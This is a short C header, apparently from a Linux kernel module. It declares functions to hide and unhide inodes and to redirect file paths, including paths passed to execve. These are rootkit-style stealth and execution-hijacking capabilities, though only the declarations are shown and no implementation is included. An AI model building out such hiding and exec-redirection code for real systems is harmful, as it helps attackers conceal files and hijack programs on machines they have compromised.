#ifndef __HIDE_FILE
#define __HIDE_FILE

struct redirect_path {
	int mode;
#define REDIRECT_PATH_EXECVE	1
	/* alloced via vmalloc */
	char *old_path;
	unsigned int old_path_len;
	char *new_path;
	unsigned int new_path_len;
};

int is_inode_hidden(u64);
void hide_inode(u64);
void unhide_inode(u64);
char *get_redirect_path(char *, int);
void redirect_path(char *, unsigned int, char *, unsigned int, int);
void unredirect_path(const char *, unsigned int, int);

#endif
